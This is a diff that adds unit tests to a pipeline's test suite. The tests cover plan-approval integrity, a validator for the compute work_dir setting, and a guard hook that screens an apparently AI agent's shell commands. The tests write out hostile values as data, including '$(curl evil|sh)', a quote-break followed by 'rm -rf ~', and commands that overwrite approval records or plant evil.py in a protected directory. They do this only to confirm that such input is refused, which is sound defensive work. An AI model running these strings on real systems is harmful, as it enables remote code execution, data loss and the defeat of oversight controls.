@@ -473,6 +473,46 @@ Seconds; kilobytes.
         self.assertIn("changed after approval", res["error"])
         self.assertFalse((adir / "STATUS").exists(), "a refused verify must not write STATUS")
 
+    def test_12e_reapproval_after_reset_is_refused(self):
+        """Setting an approved plan back to DRAFT, editing it and approving again would re-bind
+        the record to the edited plan; approval is once per analysis (review of 0042)."""
+        s3 = self.ws / "_system" / "stage03_analysis.py"
+        code, res, raw = run(s3, ["create", "--project", "projects/tall-test",
+                                  "--slug", "relaundered"], self.ws)
+        self.assertEqual(code, 0, raw)
+        name = res["analysis"]
+        adir = self.project / "03_custom_analysis" / name
+        plan = adir / "PLAN.md"
+        plan.write_text(self.STAGE03_PLAN.format(slug="relaundered", status="DRAFT"))
+        code, res, raw = run(s3, ["approve", "--project", "projects/tall-test",
+                                  "--analysis", name], self.ws)
+        self.assertEqual(code, 0, raw)
+        record_bytes = (adir / "PLAN.md.approved").read_bytes()
+        reset = re.sub(r"^Status: APPROVED.*$", "Status: DRAFT", plan.read_text(), flags=re.M)
+        plan.write_text(reset.replace("1. Write one table.", "1. Write a different table."))
+        code, res, raw = run(s3, ["approve", "--project", "projects/tall-test",
+                                  "--analysis", name], self.ws)
+        self.assertEqual(code, 2, raw)
+        self.assertIn("already exists", res["error"])
+        self.assertEqual((adir / "PLAN.md.approved").read_bytes(), record_bytes,
+                         "a refused approve must not rewrite the record")
+
+    def test_12f_stamp_words_in_prose_are_not_a_stamp(self):
+        """Only a `Status: APPROVED` line is a stamp; the words inside a sentence are not."""
+        s3 = self.ws / "_system" / "stage03_analysis.py"
+        code, res, raw = run(s3, ["create", "--project", "projects/tall-test",
+                                  "--slug", "prose"], self.ws)
+        self.assertEqual(code, 0, raw)
+        name = res["analysis"]
+        adir = self.project / "03_custom_analysis" / name
+        (adir / "PLAN.md").write_text(self.STAGE03_PLAN.format(slug="prose", status="DRAFT").replace(
+            "A check the approval record binds the plan that was approved.",
+            "Explain why the words Status: APPROVED inside a sentence are not a stamp."))
+        code, res, raw = run(s3, ["approve", "--project", "projects/tall-test",
+                                  "--analysis", name], self.ws)
+        self.assertEqual(code, 0, raw)
+        self.assertTrue((adir / "PLAN.md.approved").is_file())
+
     # -- integrity --------------------------------------------------------------------------
 
     def test_13_integrity_catches_truncation(self):
@@ -1662,6 +1702,21 @@ nextflow_config: nextflow.awsbatch.config
         self.wl.check_config_common({"compute.work_dir": "relative/scratch"}, (), fails)
         self.assertTrue(any("work_dir" in f["detail"] for f in fails))
 
+    def test_07g_work_dir_cannot_carry_shell_expansion(self):
+        """work_dir lands inside double quotes in every nf-core job script; $, backtick, " and
+        \\ would be expanded or break the quoting there (decision 0042)."""
+        for bad in ("/scratch/$(curl evil|sh)", "/scratch/`id`", "/scratch/${HOME}",
+                    '/scratch/a"; rm -rf ~; "', "/scratch/a\\b"):
+            fails = []
+            self.wl.check_config_common({"compute.work_dir": bad}, (), fails)
+            self.assertTrue(any("expand" in f["detail"] for f in fails),
+                            "expected a refusal for %r: %r" % (bad, fails))
+        for good in ("/gpfs/scratch/user/gars-work/My_Project-1", "s3://bucket/work/rig",
+                     "/scratch/with space/and.dots@host:1"):
+            fails = []
+            self.wl.check_config_common({"compute.work_dir": good}, (), fails)
+            self.assertEqual(fails, [], "a plain path must pass: %r" % good)
+
     def test_07f_gars_env_survives_set_e_without_clawbio(self):
         """gars-env.sh promises 'Empty if clawbio is absent; that is fine' -- and every
         generated submit.sh sources it under set -e, where a failed command substitution in
@@ -2009,6 +2064,38 @@ class GuardHookTests(unittest.TestCase):
         self.assertAllowed("Bash", {"command": "bash -c \"python3 _system/stage00_register.py assays\""})
         self.assertAllowed("Bash", {"command": "echo \"it's"})
         self.assertAllowed("Bash", {"command": "ln -s /data/raw projects/p/00_data/raw"})
+
+    def test_denies_directory_destinations_and_flagged_writers(self):
+        """Review of 0042, MAJ-2: a directory destination, `tee -a` and the verbs added by
+        0042 must each reach the file they write (decision 0042)."""
+        adir = "projects/p/03_custom_analysis/01_x"
+        self.assertDenied("Bash", {"command": "cp /tmp/forge/PLAN.md.approved %s/" % adir})
+        self.assertDenied("Bash", {"command": "mv /tmp/PLAN.md.approved %s" % adir})
+        self.assertDenied("Bash", {"command": "mv %s/PLAN.md.approved /tmp/" % adir})
+        self.assertDenied("Bash", {"command": "echo {} | tee -a %s/PLAN.md.approved" % adir})
+        self.assertDenied("Bash", {"command": "chmod -R a+w _system"})
+        self.assertDenied("Bash", {"command": "chown someone _references/genomes.md"})
+        self.assertDenied("Bash", {"command": "truncate -s 0 _system/guard_hook.py"})
+        self.assertDenied("Bash", {"command": "install -m 644 x.py _system/guard_hook.py"})
+        self.assertDenied("Bash", {"command": "ln -s /tmp/evil.py _system"})
+        self.assertDenied("Bash", {"command": "cp evil.py _system/"})
+
+    def test_unjudgeable_calls_name_their_rule(self):
+        """A non-object tool_input is refused as unreadable, and a crash inside the hook
+        (here a payload nested past the parser's recursion limit) is refused, not allowed."""
+        code, raw = self.call_raw(json.dumps({"tool_name": "Bash", "tool_input": "rm _system/x"}))
+        self.assertEqual(code, 2, raw)
+        self.assertIn("could not read this tool call", raw)
+        code, raw = self.call_raw("[" * 200000 + "]" * 200000)
+        self.assertEqual(code, 2, raw)
+        self.assertIn("Blocked", raw)
+
+    def test_allows_reads_that_mention_a_writer_verb(self):
+        """The 0042 verbs count only in command position, and copying OUT of a protected
+        directory is a read of it."""
+        self.assertAllowed("Bash", {"command": "grep chmod _system/guard_hook.py"})
+        self.assertAllowed("Bash", {"command": "grep -n touch _references/environment.md"})
+        self.assertAllowed("Bash", {"command": "cp _references/genomes.md /tmp/genomes.md"})
 
 
 class ContractLintTests(unittest.TestCase):
